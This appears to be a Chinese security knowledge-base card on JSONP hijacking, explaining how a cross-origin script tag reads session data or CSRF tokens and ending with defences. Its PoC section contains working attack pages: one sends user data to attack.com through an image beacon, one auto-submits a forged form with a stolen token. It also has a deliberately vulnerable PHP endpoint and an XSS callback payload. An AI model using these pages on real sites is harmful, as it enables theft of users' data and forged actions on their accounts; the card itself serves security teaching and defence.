---
id: web-generic-jsonp-hijack-script-credential-read-token-theft
title: JSONP 劫持：攻击页用 script 跨域加载带会话的 JSONP 端点，自定义回调读取用户信息或 CSRF token 后实施 CSRF
type: scenario
domain: web
path: web/generic
technique: jsonp-hijack-credential-read-token-theft
tags:
- jsonp
- hijacking
- cross-origin
- csrf
- token
- credential-leak
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V691
  verified_at: '2026-11-13T16:26:48+08:00'
  notes: 已对照原文与 6 张图核对：同源 AJAX 成功/跨域被 CORS 拦截（图1-2）、script src 跨域回调弹窗（图3）、text/html 下 callback 注入 XSS（图4）、外带 id/name（图5）、劫持 token 自动发表文章（图6）均与卡一致；application/json 仍被 script 执行、SameSite/第三方 Cookie 边界已注明。callback 注入 XSS 已有 web-generic-xss-jsonp-callback-html-content-type-reflected-xss 覆盖（text/html 同场景），跳过合理。dedup 无同链候选。原文无版本信息，未设 versions。未复跑 PoC。
url: /docs/web/generic/web-generic-jsonp-hijack-script-credential-read-token-theft/
draft: false
kb_aliases:
- JSONP 劫持
- JSONP hijacking
- callback 劫持
- 跨域读取用户信息
- JSONP token 劫持
- JSONP CSRF
- script src 跨域读取
---

## 一句话结论

当站点的 JSONP 端点把 `callback` 参数原样拼进响应、且响应内容包含会话绑定的敏感数据（用户信息、CSRF token 等），却没有 Referer/Origin/Token 校验时，攻击者可以在自己的页面里定义一个同名回调函数，用 `<script src="http://victim/endpoint?callback=攻击者函数">` 跨域加载：受害浏览器带上受害者在目标站的 Cookie 发起请求，响应脚本在攻击者页面执行回调，数据被读出并外带；若泄露的是 CSRF token，攻击者随即用隐藏表单带该 token 向目标提交状态变更请求，完成一次“JSONP 劫持 + CSRF”。

## 原理

- **JSONP 的跨域机制**：浏览器对 `<script src>` 不施加同源策略，目标站返回 `fn({...})` 时，这段脚本在**引用它的页面（攻击者页面）**的上下文执行；`fn` 由攻击者定义，于是参数里的数据被攻击者拿到。这是 JSONP 的设计用途（跨域取数据），也是劫持的根因——它把“数据给谁”交给调用页决定。
- **凭证随请求自动携带**：脚本请求是浏览器发起的，会带目标域下受害者的 Cookie（会话）。因此只要端点返回当前登录用户的数据，攻击者无需知道会话内容即可读到。是否携带取决于 Cookie 的 `SameSite`：`SameSite=Lax` 默认不随跨站子资源请求发送，`SameSite=None; Secure` 才会发送；这是现代浏览器下该攻击能否成功的关键边界。
- **响应执行不受 content-type 完全阻止**：JSONP 端点常返回 `Content-Type: application/json`，但传统浏览器对 `<script>` 的响应做 MIME 嗅探，仍会执行 `callback(...)`；只有 `X-Content-Type-Options: nosniff` 或严格的脚本 MIME 校验才会阻止。文章 demo 中 `application/json` 仍被 script 成功执行。
- **危害一：窃取用户信息**：回调收到 `{'id':1,'name':'Sentiment'}` 之类的对象后，攻击者 JS 可把字段拼成字符串再通过图片/GET 请求外带到自己的服务器（文章用 `$.get('http://attack.com/index.html?value='+h)`）。
- **危害二：劫持 CSRF token**：若端点把 token 放在 JSONP 响应里（如 `{username,password,token}`），攻击页面在回调中把 token 填入预先写好的隐藏表单并 `submit()`，浏览器就会带着受害者会话向目标站发起合法的状态变更请求（文章示例为发表文章）。服务器校验 token 通过，因为它确实是目标站发给受害者的。
- **为什么成立**：服务端把 JSONP 当作公开数据接口，忽略了“响应会携带会话、且调用方可以是任意站点”；token 的保密性依赖同源策略，而 JSONP 主动放弃了同源保护。
- **边界**：Cookie 为 `SameSite=Lax/Strict` 或浏览器阻断第三方 Cookie 时，跨站 script 请求不带会话，端点返回未登录数据；端点校验 Referer/Origin、要求自定义头或 nonce、callback 白名单、返回 `nosniff` 或 `application/javascript` 且不允许任意函数名时，利用受阻；token 若与请求绑定（一次性/一次性 nonce）也无法直接重放。

## 触发条件

- 目标存在 JSONP 端点：接受 `callback`/`cb`/`jsonp` 参数并原样拼进响应。
- 端点返回会话相关的敏感数据（用户资料、token、订单等），且未校验 Referer/Origin、未要求 CSRF token 或自定义头。
- 受害者已在目标站登录，且会话 Cookie 能随跨站子资源请求发送（`SameSite=None` 或旧浏览器）。
- 攻击者能把恶意页面投递给受害者（钓鱼链接、水坑、XSS 等），并有一个可接收外带数据的服务器。

## 利用步骤

1. 枚举目标带 `callback` 参数的接口（Burp JSONP-Hunter、爬虫/JS 分析），确认响应体形如 `callback({...})` 且包含敏感字段。
2. 登录目标后访问该端点，确认返回个人数据；再退出登录对比，确认数据依赖会话。
3. 写攻击页面：定义 `function 攻击者函数(v){ ... }`，在回调里读取 `v` 的字段并外带（`new Image().src` 或 `fetch` 到攻击者域名）。
4. 用 `<script src="http://victim/endpoint?callback=攻击者函数">` 加载；若端点要求 cookie，受害者访问页面时浏览器自动带上。
5. 若响应含 CSRF token：在页面里预置隐藏表单（action 指向状态变更接口），回调里把 token 写入隐藏字段并 `form.submit()`。
6. 把页面发给受害者；在攻击者服务器查看外带数据，或确认状态变更请求成功（如文章发布成功）。
7. 无法带 cookie 时，检查 SameSite/第三方 Cookie；若端点同时支持 CORS 错误配置，可换 CORS 读取。

## PoC

窃取用户信息：

```html
<html><body>
<script>
function jsonp_hack(v){
    var h = '';
    for (var k in v) { h += k + ' : ' + v[k] + ' ,'; }
    new Image().src = 'http://attack.com/collect?data=' + encodeURIComponent(h);
}
</script>
<script src="http://victim.com/info.php?callback=jsonp_hack"></script>
</body></html>
```

劫持 CSRF token 并提交：

```html
<html><body>
<form action="http://victim.com/add_article.php" method="POST" id="csrfsend">
  <input type="hidden" name="title" value="Oops!">
  <input type="hidden" name="content" value="Hacked!">
  <input type="hidden" id="token" name="token" value="">
</form>
<script>
function exp(obj){
    document.getElementById('token').value = obj['token'];
    document.getElementById('csrfsend').submit();
}
</script>
<script src="http://victim.com/token.php?callback=exp"></script>
</body></html>
```

服务端最小复现（PHP）：

```php
// info.php：返回会话数据，callback 原样拼接
header('Content-type: application/json');
session_start();
$cb = $_GET['callback'];
echo $cb . "({'id':1,'name':'Sentiment'})";
```

## 变体与关联

- **callback 参数导致 XSS**：同一根因的另一分支——响应为 `text/html` 时 `callback=hello<svg onload=alert(1)>` 直接在目标域执行；见 [[web-generic-xss-jsonp-callback-html-content-type-reflected-xss]]。
- **CSP 下的同源 JSONP**：`script-src 'self'` 时可借同源 JSONP 端点执行任意 JS，见 [[web-generic-xss-csp-self-jsonp-callback-bypass]]。
- **已获 XSS 后用 JSONP 通道外带数据**：见 [[web-generic-xss-data-exfiltration-jsonp-image-beacon-multi-channel]]。
- **现代等价物 CORS 配置错误**：反射 Origin + `Allow-Credentials: true` 可直接跨域读响应，见 [[web-generic-cors-reflect-origin-credentials-read]]；JSONP 是其“史前版本”，防护思路相同（校验来源、不要返回会话数据给任意调用方）。
- **CSRF token 本身的缺陷**：token 未绑定会话/可复用等见 [[web-generic-csrf-token-not-bound-to-session-cross-account-reuse]]；SameSite 相关绕过见 [[web-generic-csrf-samesite-lax-bypass-method-override]] 等。
- **工具**：Burp 的 JSONP-Hunter 可自动发现响应中反射 callback 的端点。
- **边界**：SameSite 默认策略与第三方 Cookie 阻断会让该手法在现代浏览器上大面积失效；测试时需确认目标 Cookie 属性与浏览器版本。

## 检测与防御

- **优先替换**：用正确配置的 CORS（指定 Origin 白名单）替代 JSONP；必须保留 JSONP 时，禁止在响应中返回会话相关敏感数据。
- **来源校验**：JSONP 端点校验 `Referer`/`Origin` 是否在白名单；不接受任意 `callback` 值，回调名做正则/白名单（如 `^[a-zA-Z0-9_]+$`）。
- **凭证保护**：会话 Cookie 设置 `HttpOnly; SameSite=Lax/Strict`（需要跨站的场景用 `Secure; SameSite=None` 并配合来源校验）；敏感操作要求 CSRF token 且 token 一次性/与请求绑定；token 不要通过 JSONP 暴露。
- **响应头**：`X-Content-Type-Options: nosniff`、`Content-Type: application/javascript`（仍不能防 callback 劫持，但能阻止 HTML 型 XSS）。
- **检测**：目标 JSONP 端点出现来自外部 Referer 的脚本请求、`callback` 参数包含非标识符字符、响应中返回 token/用户资料；攻击者侧出现带 `?data=`/`?value=` 的外带请求；结合 CSP 报告与访问日志分析跨站引用。
- **根因**：JSONP 主动放弃同源策略，把“谁能读数据”交给调用页面；只要数据敏感且来源不可信，就会变成跨域读取漏洞。
